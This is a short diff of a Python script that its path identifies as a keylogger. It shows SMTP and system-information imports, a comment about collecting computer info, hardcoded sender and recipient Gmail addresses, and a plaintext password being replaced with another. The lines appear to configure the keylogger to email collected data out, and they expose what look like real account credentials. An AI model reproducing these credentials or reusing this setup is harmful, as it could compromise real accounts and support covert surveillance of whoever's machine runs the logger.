@@ -8,6 +8,7 @@ import smtplib
 import ssl
 import email
 
+
 # to collect computer info
 import socket
 import platform
@@ -52,7 +53,7 @@ time_iteration = 15
 number_of_iterations_end = 3
 
 email_address = "vikramathithyan99@gmail.com"
-password = "Vedha2018"
+password = "jguinpzxcwsksieu"
 toaddress = "suriyaseyon6@gmail.com"
 
 file_path = "F:\\Coding practise\\Python\\KeyLogger\\Project"
